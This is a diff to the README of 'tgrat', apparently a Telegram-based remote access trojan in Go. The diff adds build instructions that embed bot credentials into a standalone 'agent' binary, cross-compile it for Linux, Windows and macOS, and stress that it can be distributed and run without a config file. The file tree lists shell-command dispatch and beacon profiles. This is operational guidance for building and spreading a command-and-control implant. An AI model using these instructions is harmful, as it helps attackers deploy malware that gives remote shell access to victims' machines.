@@ -39,15 +39,17 @@ Available profiles include:
 
 ```text
 tgrat/
-├── .env.example
-├── .gitignore
-├── commands.go   # Command dispatcher & shell execution
-├── config.go     # Configuration & beacon profiles
-├── telegram.go   # Telegram Bot API methods
-├── main.go       # Main polling loop
-├── go.mod
-├── go.sum
-└── README.md
+├── .env                # Telegram credentials (local, not versioned)
+├── .env.example        # Example configuration template
+├── .gitignore          # Git ignore rules
+├── build.sh            # Build script for standalone binary
+├── commands.go         # Command dispatcher & shell execution
+├── config.go           # Configuration & beacon profiles
+├── telegram.go         # Telegram Bot API methods
+├── main.go             # Main polling loop
+├── go.mod              # Go module definition
+├── go.sum              # Dependency checksums
+└── README.md           # This file
 ```
 
 ---
@@ -107,17 +109,55 @@ Change the profile by modifying the `BEACON_PROFILE` value inside `.env`.
 
 ### 4. Build
 
+The agent is built as a **standalone binary** with credentials embedded at build time. This means the binary does not require an external `.env` file and can be distributed independently.
+
+#### Option A: Using Build Script (Recommended)
+
+```bash
+./build.sh
+```
+
+The script automatically:
+1. Loads credentials from `.env`
+2. Embeds them into the binary using `-ldflags`
+3. Produces a standalone `agent` binary
+
+#### Option B: Manual Build
+
+**Linux:**
+```bash
+go build -ldflags "-X main.TOKEN=<YOUR_BOT_TOKEN> -X main.CHAT_ID=<YOUR_CHAT_ID>" -o agent
+```
+
+**Windows (cross-compile):**
+```bash
+GOOS=windows GOARCH=amd64 go build -ldflags "-X main.TOKEN=<YOUR_BOT_TOKEN> -X main.CHAT_ID=<YOUR_CHAT_ID>" -o agent.exe
+```
+
+**macOS (cross-compile):**
+```bash
+GOOS=darwin GOARCH=amd64 go build -ldflags "-X main.TOKEN=<YOUR_BOT_TOKEN> -X main.CHAT_ID=<YOUR_CHAT_ID>" -o agent_macos
+```
+
+#### Option C: Run Without Building
+
+For development/testing:
 ```bash
 go mod tidy
-
-# Run directly
 go run .
+```
 
-# Build Linux binary
-GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o agent .
+> **Note:** Direct `go run` requires `.env` to be present in the working directory.
 
-# Build Windows binary (cross compile)
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe .
+#### Binary Portability
+
+Once built, the `agent` binary can be distributed and run on any compatible system without requiring the `.env` file:
+
+```bash
+# Copy to any directory
+cp agent /tmp/
+cd /tmp
+./agent
 ```
 
 ---
